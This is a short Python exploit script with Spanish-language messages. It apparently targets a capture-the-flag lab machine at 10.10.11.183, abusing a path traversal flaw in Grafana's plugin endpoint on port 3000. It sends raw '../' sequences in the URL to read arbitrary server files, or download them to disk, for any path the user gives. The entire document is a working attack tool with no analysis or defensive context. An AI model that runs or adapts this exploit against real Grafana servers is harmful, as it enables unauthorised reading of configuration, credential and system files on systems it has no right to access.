#!/bin/python3

import sys, signal, requests

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

url = 'http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../'

def showHelp(message='<opcion>'):
    print(f"\n[!] Uso: python3 {sys.argv[0]} {message}\n")
    if message == '<opcion>':
        print("\n\t-r [DIR/ARCHIVO]:\tModo de solo lectura")
        print("\n\t-d [DIR/ARCHIVO] [NOMBRE]:\tModo descarga archivo")
    sys.exit(1)

def makeRequest():
    if len(sys.argv) < 3:
        if sys.argv[1] == '-r':
            showHelp(message='-r [DIR/ARCHIVO]')
        elif sys.argv[1] == '-d':
            showHelp(message='-d [DIR/ARCHIVO] [NOMBRE]')
        else:
            showHelp()

    url_dpt = url + sys.argv[2]
    s = requests.Session()
    r = requests.Request(method='GET', url=url_dpt)
    prep = r.prepare()
    prep.url = url_dpt
    response = s.send(prep)

    if sys.argv[1] == '-r':
        print(response.text)
    elif sys.argv[1] == '-d':
        if len(sys.argv) < 4:
            showHelp('-d ' + sys.argv[2] + ' [NOMBRE]')
        else:
            downloadRequest(res=response, name=sys.argv[3])
    else:
        showHelp()

def downloadRequest(res, name):
    open(name, "wb").write(res.content)
    print(f'\n[+] Archivo {name} descargado')

def main():
    if len(sys.argv) < 2 or sys.argv[1] == '-h' :
        showHelp()
    else:
        makeRequest()

if __name__ == "__main__":
    main()